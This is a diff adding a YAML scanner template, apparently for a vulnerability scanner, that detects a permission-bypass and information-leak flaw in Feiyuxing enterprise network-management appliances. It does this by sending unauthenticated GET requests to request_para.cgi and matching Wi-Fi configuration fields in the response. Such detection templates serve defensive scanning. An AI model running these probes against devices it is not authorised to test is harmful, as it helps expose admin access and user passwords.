@@ -1,0 +1,29 @@
+id: feiyuxing-info-leak
+
+info:
+  name: 飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞
+  author: zan8in
+  severity: high
+  description: |
+    飞鱼星 企业级智能上网行为管理系统 存在权限绕过以及信息泄露漏洞，可以获取管理员权限以及用户密码
+    title="飞鱼星企业级智能上网行为管理系统"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/%E9%A3%9E%E9%B1%BC%E6%98%9F/%E9%A3%9E%E9%B1%BC%E6%98%9F%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /request_para.cgi?parameter=wifi_get_5g_host
+    expression: response.status == 200 && response.body.bcontains(b'"wl_enable_5g":') && response.body.bcontains(b'"wl_hide_5g":')
+  r1:
+    request:
+      method: GET
+      path: /request_para.cgi?parameter=wifi_info
+    expression: response.status == 200 && response.body.bcontains(b'"wl_enable_2g":') && response.body.bcontains(b'"wl_enable_5g":')
+  r2:
+    request:
+      method: GET
+      path: /request_para.cgi?parameter=wifi_info
+    expression: response.status == 200 && response.body.bcontains(b'"wl_enable_2g":') && response.body.bcontains(b'"wl_hide_2g":')
+expression: r0() || r1() || r2()
